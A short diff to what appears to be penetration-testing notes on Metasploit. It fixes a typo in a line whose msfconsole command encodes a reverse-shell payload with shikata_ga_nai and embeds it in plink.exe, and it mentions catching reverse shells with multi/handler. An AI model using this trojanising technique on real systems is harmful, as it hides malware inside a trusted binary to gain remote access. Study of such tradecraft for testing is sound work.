@@ -846,7 +846,7 @@ To interact with a module
 
 #### Other notes
 
-- `generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe` mbedding the payload in plink.exe from within msfconsole
+- `generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe` embedding the payload in plink.exe from within msfconsole
 - Use the framework `multi/handler` to catch standard reverse shells
   - Works for all single and multi-stage payloads
   - Specify the incoming payload type
